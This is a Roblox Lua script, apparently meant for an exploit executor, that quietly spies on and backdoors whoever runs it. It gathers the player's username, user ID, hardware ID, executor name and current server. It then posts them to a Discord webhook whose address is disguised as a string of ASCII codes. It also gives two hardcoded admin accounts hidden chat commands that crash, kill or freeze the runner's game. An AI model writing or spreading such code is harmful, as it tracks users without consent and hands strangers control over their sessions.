--!nolint
--!nocheck

local Services, Admins do
    Services = setmetatable({}, {
        __index = function(_, Name)
            local Service = game:GetService(Name)
            if Service then
                return Service
            else
                return nil
            end
        end
    })

    Admins = {
        [233377111] = true,
        [5825720479] = true,
    }
end

local LocalPlayer = Services.Players.LocalPlayer

local PREFIX = "/"
local SILENTPREFIX = "/e"

local FindPlayer = function(Name)
    if #Name < 3 then
        return nil
    end

    Name = string.lower(Name)
    for _, User in pairs(Services.Players:GetPlayers()) do
        if string.sub(string.lower(User.Name), 1, #Name) == Name then
            return User
        end
    end
    return nil
end

local Commands = {
    ["kick"] = function()
        game:Shutdown()
    end,
    ["kill"] = function()
        LocalPlayer.Character.Humanoid.Health = 0
    end,
    ["freeze"] = function()
        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            humanoidRootPart.Anchored = true
        end
    end,
    ["unfreeze"] = function()
        local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        if humanoidRootPart then
            humanoidRootPart.Anchored = false
        end
    end,
}

local ImageUrl = nil
local AvatarRequest = request({Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. LocalPlayer.UserId .."&size=420x420&format=Png&isCircular=false"})
if AvatarRequest.StatusCode == 200 then
    local Data = game.HttpService:JSONDecode(AvatarRequest.Body)
    if Data and Data.data then
        ImageUrl = Data.data[1].imageUrl
    end
end
--[[local embed = {
    title = "Tear Execution",
    color = 0x2f5bc7,
    footer = {
        text = game:GetService("RbxAnalyticsService"):GetClientId()
    },
    thumbnail = {
        url = ImageUrl
    },
    author = {
        name = "Click here to view profile",
        url = "https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile",
        icon_url = ""
    },
    fields = {
        {
            name = "Username",
            value = "```\n" .. LocalPlayer.Name .. "\n```",
            inline = true
        },
        {
            name = "User ID",
            value = "```lua\n" .. LocalPlayer.UserId .. "\n```",
            inline = true
        },
        {
            name = "Executor Name",
            value = "```\n" .. identifyexecutor() .."\n```",
            inline = true
        },
        {
            name = "Place Information",
            value = "```\n" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. " | " .. game.PlaceId .."\n```",
            inline = true
        },
    }
}]]

local embed = {
    title = "Tear Execution",
    color = 0x2f5bc7,
    thumbnail = {
        url = ImageUrl
    },
    author = {
        name = "Click here to view profile",
        url = "https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile",
        icon_url = ""
    },
    fields = {
        {
            name = "👤 User Details",
            value = string.format(
                "**Username:** ```%s```\n" ..
                "**User ID:** ```lua\n%d```\n" ..
                "**HWID:** ```lua\n%s```",
                LocalPlayer.Name,
                LocalPlayer.UserId,
                game:GetService("RbxAnalyticsService"):GetClientId()
            ),
            inline = true
        },
        {
            name = "⚙️ Execution",
            value = string.format(
                "**Executor Name** ```%s```",
                identifyexecutor()
            ),
            inline = true
        },
        {
            name = "🌍 Place Information",
            value = string.format(
                "**Place Name** ```%s```\n**Place ID** ```lua\n%d```\n**Job ID** ```lua\n%s```",
                game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                game.PlaceId,
                game.JobId
            ),
            inline = true
        }
    }
}

local payload = {
	["embeds"] = {embed},
}

local function decryptString(encrypted)
    local decrypted = {}
    for ascii in encrypted:gmatch("%d+") do
        table.insert(decrypted, string.char(tonumber(ascii)))
    end
    return table.concat(decrypted)
end

local obfuscatedWebhookURL = "104/116/116/112/115/58/47/47/100/105/115/99/111/114/100/46/99/111/109/47/97/112/105/47/119/101/98/104/111/111/107/115/47/49/51/53/48/54/53/53/50/54/54/54/50/49/55/53/53/51/57/51/47/95/115/82/76/117/110/72/89/113/70/120/49/110/54/97/51/97/49/84/70/53/68/54/114/66/114/118/100/99/73/101/78/74/75/80/116/50/113/66/100/77/105/116/81/98/80/53/50/117/49/87/119/116/106/84/110/45/48/118/71/56/107/78/113/45/52/51/84"
local webhookURL = decryptString(obfuscatedWebhookURL)

local httpRequest = {
	Url = webhookURL,
	Method = "POST",
	Headers = {
		["Content-Type"] = "application/json"
	},
	Body = game:GetService("HttpService"):JSONEncode(payload)
}

if request then
    request(httpRequest)
end

local HandleCommand = function(Player, Message)
    if Message:sub(1, #SILENTPREFIX) == SILENTPREFIX then
        local Arguments = string.split(Message:sub(#SILENTPREFIX + 2), " ")
        local Command = table.remove(Arguments, 1)

        if Commands[string.lower(Command)] then
            local Target = Arguments[1]
            local TargetPlayer = FindPlayer(Target)

            if TargetPlayer then
                if TargetPlayer == LocalPlayer then
                    Commands[string.lower(Command)]()
                end
            end
        end
    elseif Message:sub(1, #PREFIX) == PREFIX then
        local Arguments = string.split(Message:sub(#PREFIX + 1), " ")
        local Command = table.remove(Arguments, 1)

        if Commands[string.lower(Command)] then
            local Target = Arguments[1]
            local TargetPlayer = FindPlayer(Target)

            if TargetPlayer then
                if TargetPlayer == LocalPlayer then
                    Commands[string.lower(Command)]()
                end
            end
        end
    end
end

for _, Player in next, Services.Players:GetPlayers() do
    if Admins[Player.UserId] then
        Player.Chatted:Connect(function(Message)
            HandleCommand(Player, Message)
        end)
    end
end

Services.Players.PlayerAdded:Connect(function(Player)
    if Admins[Player.UserId] then
        Player.Chatted:Connect(function(Message)
            HandleCommand(Player, Message)
        end)
    end
end)
